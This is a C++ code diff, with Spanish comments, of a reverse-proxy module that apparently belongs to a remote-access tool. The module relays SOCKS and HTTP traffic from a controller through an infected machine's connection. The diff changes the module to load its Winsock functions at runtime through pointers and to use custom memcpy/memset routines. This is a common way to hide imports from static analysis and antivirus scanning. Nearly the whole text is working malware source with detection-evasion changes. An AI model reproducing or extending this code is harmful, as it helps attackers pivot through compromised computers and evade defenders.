@@ -4,10 +4,18 @@
 
 extern Cliente* cCliente;
 
-ReverseProxy::ReverseProxy() {
-	if (WSAStartup(MAKEWORD(2, 2), &this->wsa) != 0) {
-		_DBG_("WSAStartup error", WSAGetLastError());
+ReverseProxy::ReverseProxy(st_Ws2_32& _ws2_32) {
+	this->WS32 = _ws2_32;
+
+	if (this->WS32.pWsaStartup) {
+		WSADATA wsa;
+		if (this->WS32.pWsaStartup(MAKEWORD(2, 2), &wsa) != 0) {
+			_DBG_("WSAStartup error", WSAGetLastError());
+		}
+	}else {
+		__DBG_("[X][ReverseProxy] No se cargo la funcion pWsaStartup");
 	}
+
 }
 
 void ReverseProxy::m_ProcesarDatosProxy(std::vector<char>& _vcdata, int _recibido) {
@@ -19,7 +27,7 @@ void ReverseProxy::m_ProcesarDatosProxy(std::vector<char>& _vcdata, int _recibid
 	int data_size = _recibido - sizeof(int);
 	int id_conexion = 0;
 	
-	memcpy(&id_conexion, _vcdata.data() + data_size, sizeof(int));
+	m_memcpy(&id_conexion, _vcdata.data() + data_size, sizeof(int));
 	
 	_DBG_("ID Conexion: ", id_conexion);
 
@@ -29,7 +37,11 @@ void ReverseProxy::m_ProcesarDatosProxy(std::vector<char>& _vcdata, int _recibid
 		char cRespuesta[2] = { _vcdata[0], 0x00 };
 
 		if (this->cSend(cCliente->sckSocket, cRespuesta, 2, id_conexion) == SOCKET_ERROR) {
-			_DBG_("[Proxy]cSend error", WSAGetLastError());
+			int err_wsa = 0;
+			if (this->WS32.pWSAGetLastError) {
+				err_wsa = this->WS32.pWSAGetLastError();
+			}
+			_DBG_("[Proxy]cSend error", err_wsa);
 		}
 	}else if (this->isSocksSegundoPaso(_vcdata, data_size)) {
 		//Paso final SOCKS
@@ -47,13 +59,13 @@ void ReverseProxy::m_ProcesarDatosProxy(std::vector<char>& _vcdata, int _recibid
 			size_t port_len = 2;
 			size_t host_len = data_size - head_len - port_len - 1;
 			cHost.resize(data_size - head_len - port_len);
-			memcpy(cHost.data(), _vcdata.data() + 5, host_len);
+			m_memcpy(cHost.data(), _vcdata.data() + 5, host_len);
 		}
 
 		u_short nPort = 0;
 		int iPort = 0;
 		size_t nPortOffset = data_size - 2;
-		memcpy(&nPort, _vcdata.data() + nPortOffset, 2);
+		m_memcpy(&nPort, _vcdata.data() + nPortOffset, 2);
 		iPort = static_cast<int>(ntohs(nPort));
 
 		std::string strPort = std::to_string(iPort);
@@ -130,7 +142,7 @@ void ReverseProxy::m_ProcesarDatosProxy(std::vector<char>& _vcdata, int _recibid
 
 				_vcdata.insert(_vcdata.begin() + offset, nRequest.strPath.size(), ' ');
 
-				memcpy(_vcdata.data() + offset, nRequest.strPath.c_str(), nRequest.strPath.size());
+				m_memcpy(_vcdata.data() + offset, nRequest.strPath.c_str(), nRequest.strPath.size());
 			}
 
 			SOCKET sckPuntoFinal = this->m_sckConectar(nRequest.strHost.c_str(), nRequest.strPort.c_str());
@@ -163,17 +175,21 @@ void ReverseProxy::m_ProcesarDatosProxy(std::vector<char>& _vcdata, int _recibid
 }
 
 int ReverseProxy::sendAllLocal(SOCKET& _socket, const char* _cbuffer, int _buff_size) {
+	if (!this->WS32.pSend || !this->WS32.pWSAGetLastError) {
+		__DBG_("[X][sendAllLocal no se cargaron las funciones");
+		return -1;
+	}
 	int iEnviado = 0;
 	int iRetrys = RETRY_COUNT;
 	int iTotalEnviado = 0;
 
 	while (iTotalEnviado < _buff_size) {
-		iEnviado = send(_socket, _cbuffer + iTotalEnviado, _buff_size - iTotalEnviado, 0);
+		iEnviado = this->WS32.pSend(_socket, _cbuffer + iTotalEnviado, _buff_size - iTotalEnviado, 0);
 		if (iEnviado == 0) {
 			break;
 		}
 		else if (iEnviado == SOCKET_ERROR) {
-			int error_code = WSAGetLastError();
+			int error_code = this->WS32.pWSAGetLastError();
 			if (error_code == WSAEWOULDBLOCK) {
 				if (iRetrys-- > 0) {
 					__DBG_("[sendAllLocal] Intento escritura...");
@@ -194,18 +210,24 @@ int ReverseProxy::sendAllLocal(SOCKET& _socket, const char* _cbuffer, int _buff_
 std::vector<char> ReverseProxy::readAllLocal(SOCKET& _socket, int& _out_recibido) {
 	_out_recibido = SOCKET_ERROR;
 	std::vector<char> vcOut;
+	
+	if (!this->WS32.pRecv || !this->WS32.pWSAGetLastError) {
+		__DBG_("[X][sendAllLocal no se cargaron las funciones");
+		return vcOut;
+	}
+
 	int iChunk = 1024;
 	int iTotalRecibido = 0;
 	int iRetrys = RETRY_COUNT;
 	int iRecibido = 0;
 	while (1) {
 		char cTempBuffer[1024];
-		iRecibido = recv(_socket, cTempBuffer, iChunk, 0);
+		iRecibido = this->WS32.pRecv(_socket, cTempBuffer, iChunk, 0);
 		if (iRecibido == 0) {
 			break;
 		}
 		else if (iRecibido == SOCKET_ERROR) {
-			int error_wsa = WSAGetLastError();
+			int error_wsa = this->WS32.pWSAGetLastError();
 			if (error_wsa == WSAEWOULDBLOCK) {
 				if (iRetrys-- > 0) {
 					//DEBUG_MSG("[!] Intento lectura...");
@@ -223,7 +245,7 @@ std::vector<char> ReverseProxy::readAllLocal(SOCKET& _socket, int& _out_recibido
 
 		vcOut.resize(iTotalRecibido);
 
-		memcpy(vcOut.data() + (iTotalRecibido - iRecibido), cTempBuffer, iRecibido);
+		m_memcpy(vcOut.data() + (iTotalRecibido - iRecibido), cTempBuffer, iRecibido);
 
 		_out_recibido = iTotalRecibido;
 	}
@@ -236,57 +258,71 @@ int ReverseProxy::cSend(SOCKET& _socket, const char* _cbuffer, size_t _buff_size
 	std::vector<char> finalData(nSize);
 
 	//   DATA | ID_CONEXION
-	memcpy(finalData.data(), _cbuffer, _buff_size);
-	memcpy(finalData.data() + _buff_size, &_id_conexion, sizeof(int));
+	m_memcpy(finalData.data(), _cbuffer, _buff_size);
+	m_memcpy(finalData.data() + _buff_size, &_id_conexion, sizeof(int));
 
 	return cCliente->cChunkSend(_socket, finalData.data(), nSize, 0, false, nullptr, EnumComandos::PROXY_CMD);
 }
 
 SOCKET ReverseProxy::m_sckConectar(const char* _host, const char* _puerto) {
+	if (!this->WS32.pGetAddrInfo ||
+		!this->WS32.pSocket ||
+		!this->WS32.pConnect ||
+		!this->WS32.pFreeAddrInfo ||
+		!this->WS32.pIoctlSocket ||
+		!this->WS32.pWSAGetLastError) {
+		__DBG_("[X]m_sckConectar: No se cargaron las funciones");
+		return false;
+	}
 	struct addrinfo sAddress, * sP, * sServer;
-	memset(&sAddress, 0, sizeof(sAddress));
+	m_memset(&sAddress, 0, sizeof(sAddress));
 
 	SOCKET temp_socket = INVALID_SOCKET;
 
 	sAddress.ai_family = AF_UNSPEC;
 	sAddress.ai_socktype = SOCK_STREAM;
 
-	int iRes = getaddrinfo(_host, _puerto, &sAddress, &sServer);
+	int iRes = this->WS32.pGetAddrInfo(_host, _puerto, &sAddress, &sServer);
 	if (iRes != 0) {
-		_DBG_("[X] getaddrinfo error", WSAGetLastError());
+		_DBG_("[X] getaddrinfo error", this->WS32.pWSAGetLastError());
 		return temp_socket;
 	}
 
 	for (sP = sServer; sP != nullptr; sP = sP->ai_next) {
-		if ((temp_socket = socket(sP->ai_family, sP->ai_socktype, sP->ai_protocol)) == INVALID_SOCKET) {
+		if ((temp_socket = this->WS32.pSocket(sP->ai_family, sP->ai_socktype, sP->ai_protocol)) == INVALID_SOCKET) {
 			//socket error
 			continue;
 		}
 
-		if (connect(temp_socket, sP->ai_addr, sP->ai_addrlen) == -1) {
+		if (this->WS32.pConnect(temp_socket, sP->ai_addr, sP->ai_addrlen) == -1) {
 			//No se pudo conectar
-			_DBG_("[X] No se pudo conectar. Host: " + std::string(_host), WSAGetLastError());
+			_DBG_("[X] No se pudo conectar. Host: " + std::string(_host), this->WS32.pWSAGetLastError());
 			continue;
 		}
 		break;
 	}
 
 	if (sP == nullptr || temp_socket == INVALID_SOCKET) {
-		freeaddrinfo(sServer);
+		this->WS32.pFreeAddrInfo(sServer);
 		return temp_socket;
 	}
 
-	unsigned long int iBlock = 1;
-	if (ioctlsocket(temp_socket, FIONBIO, &iBlock) != 0) {
-		_DBG_("[X] No se pudo hacer non_block", WSAGetLastError());
+	u_long iBlock = 1;
+	if (this->WS32.pIoctlSocket(temp_socket, FIONBIO, &iBlock) != 0) {
+		_DBG_("[X] No se pudo hacer non_block", this->WS32.pWSAGetLastError());
 	}
 
-	freeaddrinfo(sServer);
+	this->WS32.pFreeAddrInfo(sServer);
 
 	return temp_socket;
 }
 
 std::vector<char> ReverseProxy::strParseIP(const uint8_t* addr, uint8_t addr_type) {
+	if (!this->WS32.pInetntoP) {
+		std::vector<char> n;
+		__DBG_("[X]strParseIP no se cargo la funcion");
+		return n;
+	}
 	int addr_size = 0;
 	int iFamily = 0;
 	if (addr_type == 0x01) { //IPv4
@@ -298,7 +334,7 @@ std::vector<char> ReverseProxy::strParseIP(const uint8_t* addr, uint8_t addr_typ
 		iFamily = AF_INET6;
 	}
 	std::vector<char> vc_ip(addr_size);
-	inet_ntop(iFamily, addr, vc_ip.data(), addr_size);
+	this->WS32.pInetntoP(iFamily, addr, vc_ip.data(), addr_size);
 
 	return vc_ip;
 }
@@ -402,6 +438,10 @@ HTTPRequest ReverseProxy::parseHTTPrequest(const std::vector<char>& _vcdata) {
 }
 
 void ReverseProxy::th_Handle_Session(int _id_conexion) {
+	if (!this->WS32.pSelect || !this->WS32.pCloseSocket || !this->WS32.pWSAGetLastError) {
+		__DBG_("[X]th_Handle_Session no se cargaron las funciones");
+		return;
+	}
 	std::this_thread::sleep_for(std::chrono::milliseconds(50));
 
 	SOCKET _socket_punto_final = this->getLocalSocket(_id_conexion);
@@ -423,7 +463,7 @@ void ReverseProxy::th_Handle_Session(int _id_conexion) {
 	while (isRunning) {
 		fd_set fdMaster_Copy = fdMaster;
 
-		int iNumeroSockets = select(_socket_punto_final + 1, &fdMaster_Copy, nullptr, nullptr, &timeout);
+		int iNumeroSockets = this->WS32.pSelect(_socket_punto_final + 1, &fdMaster_Copy, nullptr, nullptr, &timeout);
 
 		for (int index = 0; index < iNumeroSockets; index++) {
 			SOCKET temp_socket = fdMaster_Copy.fd_array[index];
@@ -434,15 +474,15 @@ void ReverseProxy::th_Handle_Session(int _id_conexion) {
 				std::vector<char> vcData = this->readAllLocal(_socket_punto_final, iRecibido);
 				if (iRecibido > 0) {
 					if (this->cSend(cCliente->sckSocket, vcData.data(), iRecibido, _id_conexion) == SOCKET_ERROR) {
-						_DBG_("[X] Error enviado respuesta del punto final", WSAGetLastError());
+						_DBG_("[X] Error enviado respuesta del punto final", this->WS32.pWSAGetLastError());
 						FD_CLR(temp_socket, &fdMaster);
-						closesocket(temp_socket);
+						this->WS32.pCloseSocket(temp_socket);
 						isRunning = false;
 						break;
 					}
 				}else if (iRecibido == SOCKET_ERROR) {
 					FD_CLR(_socket_punto_final, &fdMaster);
-					closesocket(_socket_punto_final);
+					this->WS32.pCloseSocket(_socket_punto_final);
 					isRunning = false;
 					break;
 				}
